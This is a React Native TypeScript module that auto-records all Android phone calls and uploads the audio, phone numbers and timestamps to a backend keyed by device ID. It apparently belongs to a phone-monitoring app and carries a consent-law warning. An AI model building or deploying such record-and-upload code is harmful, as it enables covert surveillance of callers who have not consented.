// ═══════════════════════════════════════════════════════════════
// Call Recording — record phone calls
// ═══════════════════════════════════════════════════════════════
// ⚠️  LEGAL WARNING: Call recording is illegal in some jurisdictions
// without consent from all parties. Check local laws before enabling.
// Two-party consent states (US): CA, CT, FL, IL, MD, MA, MI, MT,
// NV, NH, PA, WA.
// ═══════════════════════════════════════════════════════════════

import { Platform, NativeModules, PermissionsAndroid } from 'react-native'
import { reportData } from './api'
import { getStoredDeviceId } from './api'

export type CallRecording = {
  id: string
  phoneNumber: string
  callType: 'INCOMING' | 'OUTGOING'
  audioBase64: string
  durationSec: number
  timestamp: string
}

let isRecording = false
let listener: any = null

/**
 * Enable call recording (Android only).
 * Automatically records all incoming and outgoing calls.
 */
export async function enableCallRecording(): Promise<boolean> {
  if (Platform.OS !== 'android') return false

  const hasPermission = await requestCallRecordingPermissions()
  if (!hasPermission) return false

  try {
    const { CallRecorder } = NativeModules
    if (!CallRecorder) return false

    listener = CallRecorder.addListener((event: any) => {
      handleCallRecording(event)
    })

    await CallRecorder.start()
    isRecording = true
    return true
  } catch (e) {
    console.error('Failed to enable call recording:', e)
    return false
  }
}

/**
 * Disable call recording.
 */
export async function disableCallRecording(): Promise<void> {
  if (Platform.OS !== 'android') return

  try {
    const { CallRecorder } = NativeModules
    if (!CallRecorder) return

    if (listener) {
      listener.remove()
      listener = null
    }

    await CallRecorder.stop()
    isRecording = false
  } catch {}
}

/**
 * Check if call recording is enabled.
 */
export function isCallRecordingEnabled(): boolean {
  return isRecording
}

/**
 * Handle a call recording event.
 */
async function handleCallRecording(event: {
  phoneNumber: string
  callType: string
  audioBase64: string
  durationSec: number
}): Promise<void> {
  const recording: CallRecording = {
    id: `${Date.now()}-${Math.random()}`,
    phoneNumber: event.phoneNumber,
    callType: event.callType === 'INCOMING' ? 'INCOMING' : 'OUTGOING',
    audioBase64: event.audioBase64,
    durationSec: event.durationSec,
    timestamp: new Date().toISOString(),
  }

  const deviceId = await getStoredDeviceId()
  if (deviceId) {
    await reportData(deviceId, 'CALL_RECORDING', recording)
  }
}

/**
 * Request permissions for call recording.
 */
async function requestCallRecordingPermissions(): Promise<boolean> {
  if (Platform.OS !== 'android') return false

  try {
    const permissions = [
      PermissionsAndroid.PERMISSIONS.RECORD_AUDIO,
      PermissionsAndroid.PERMISSIONS.READ_CALL_LOG,
      PermissionsAndroid.PERMISSIONS.CAPTURE_AUDIO_OUTPUT,
    ]

    const results = await PermissionsAndroid.requestMultiple(permissions)
    return Object.values(results).every(
      (r) => r === PermissionsAndroid.RESULTS.GRANTED
    )
  } catch {
    return false
  }
}

/**
 * Manually record a single call (not auto-record).
 */
export async function recordSingleCall(
  phoneNumber: string,
  callType: 'INCOMING' | 'OUTGOING'
): Promise<CallRecording | null> {
  if (Platform.OS !== 'android') return null

  const hasPermission = await requestCallRecordingPermissions()
  if (!hasPermission) return null

  try {
    const { CallRecorder } = NativeModules
    if (!CallRecorder) return null

    const audioBase64 = await CallRecorder.recordCall()
    const recording: CallRecording = {
      id: `${Date.now()}-${Math.random()}`,
      phoneNumber,
      callType,
      audioBase64,
      durationSec: 0,
      timestamp: new Date().toISOString(),
    }

    const deviceId = await getStoredDeviceId()
    if (deviceId) {
      await reportData(deviceId, 'CALL_RECORDING', recording)
    }

    return recording
  } catch {
    return null
  }
}
